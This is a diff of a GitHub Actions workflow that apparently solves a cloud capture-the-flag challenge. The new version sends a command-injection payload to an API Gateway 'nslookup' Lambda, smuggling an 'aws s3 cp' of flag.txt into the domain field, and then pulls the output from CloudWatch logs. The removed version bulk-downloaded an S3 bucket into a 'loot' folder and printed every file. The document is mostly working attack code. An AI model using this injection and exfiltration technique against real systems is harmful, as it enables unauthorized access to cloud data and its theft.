@@ -21,21 +21,38 @@ jobs:
 
       - name: Invoke Vulnerable Lambda
         run: |
-          BUCKET="codec4f26c862a321ef5"
+          API_ID="3q931syi7b"
+          REGION="us-east-1"
+          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          echo "=== 1. RECURSIVELY LISTING ALL FILES IN THE BUCKET ==="
-          aws s3 ls "s3://$BUCKET" --recursive
+          echo "=== 1. FORCING LAMBDA TO READ THE FLAG INTO LOGS ==="
+          # This tells the Lambda to use its internal AWS CLI to read flag.txt from the bucket and log it out
+          PAYLOAD='{"domain": "127.0.0.1; aws s3 cp s3://codec4f26c862a321ef5/flag.txt -"}'
+          
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD"
           
           echo ""
-          echo "=== 2. DOWNLOADING EVERYTHING LOCALLY ==="
-          mkdir -p s3_loot
-          aws s3 sync "s3://$BUCKET" ./s3_loot/
+          echo "=== 2. WAITING 3 SECONDS FOR LOGS TO SYNC ==="
+          sleep 3
           
-          echo ""
-          echo "=== 3. PRINTING CONTENTS OF ALL DOWNLOADED FILES ==="
-          # This will automatically find every file in the loot folder and print its contents to the log
-          find ./s3_loot -type f -exec echo "====================" \; \
-                         -exec echo "FILE: {}" \; \
-                         -exec echo "====================" \; \
-                         -exec cat {} \; \
-                         -exec echo "" \;
+          echo "=== 3. PULLING LOGS VIA ALTERNATIVE API ==="
+          # Get the latest log stream name
+          STREAM_NAME=$(aws logs describe-log-streams \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --order-by LastEventTime \
+            --descending \
+            --limit 1 \
+            --query 'logStreams[0].logStreamName' \
+            --output text --region ${REGION})
+          
+          echo "Found Log Stream: $STREAM_NAME"
+          
+          # Fetch the actual log events using GetLogEvents
+          aws logs get-log-events \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --log-stream-name "$STREAM_NAME" \
+            --region ${REGION} \
+            --query 'events[*].message' \
+            --output text
